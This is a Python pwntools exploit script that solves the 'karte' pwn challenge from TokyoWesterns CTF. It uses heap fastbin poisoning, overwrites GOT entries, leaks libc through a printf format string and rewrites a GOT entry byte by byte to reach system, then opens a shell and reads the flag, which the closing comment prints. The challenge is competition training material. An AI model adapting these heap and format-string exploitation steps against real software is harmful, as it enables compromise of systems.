#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = 'karte.chal.ctf.westerns.tokyo'
port = 10001
r = remote(host ,port)

def add(s,c):
  r.sendlineafter("> ", "1")
  r.recvuntil("> ")
  r.sendline(str(s))
  r.recvuntil("> ")
  r.send(c)
  r.recvuntil("id ")
  return int(r.recvuntil("\n")[:-1])

def modify(i,c):
  r.sendlineafter("> ", "4")
  r.recvuntil("> ")
  r.sendline(str(i))
  r.recvuntil("> ")
  r.send(c)

def free(i):
  r.sendlineafter("> ", "3")
  r.recvuntil("> ")
  r.sendline(str(i))

def chuck(i):
    id1 = add(0x68,"a"*0x67)
    free(id1)

def crack(i):
  r.recvuntil("> ")
  r.send("%{}c%9$hhn".format((s>>(i*8))&0xff).ljust(0x18,"a") + p64(0x602018+i)[:-1])


r.recvuntil("... ")
r.send("a"*0x3f)
t = 0x602145

for i in range(7):
    chuck(i)
  
sh = add(0x21000,"sh")

id1 = add(0x68,"a")
id2 = add(0x68,"a")
free(id1)
free(id2)

modify(id2, p64(t)[0:4])
  
id1 = add(0x18,"a")
id2 = add(0x68,"a")
free(id1)
  
id1 = add(0x68,"a"*0xb + p64(1) + p64(0x602078) + p64(0x0000deadc0bebeef)) 
modify(0,p64(0x0400760)[:6])

r.recvuntil("> ")
r.sendline("5%19$p*")
r.recvuntil("5")

s = int(r.recvuntil("*")[:-1],16) - 0x21b97 + 0x4f440

for i in range(6):
    crack(i)

r.recvuntil("> ")
r.sendline("aaa")
r.recvuntil("> ")
r.sendline("%" + str(sh) + "c")
r.sendline("ls; cat flag*")
r.interactive()

'''
flag
karte
TWCTF{pr1n7l355_15_50_53cur3!}
'''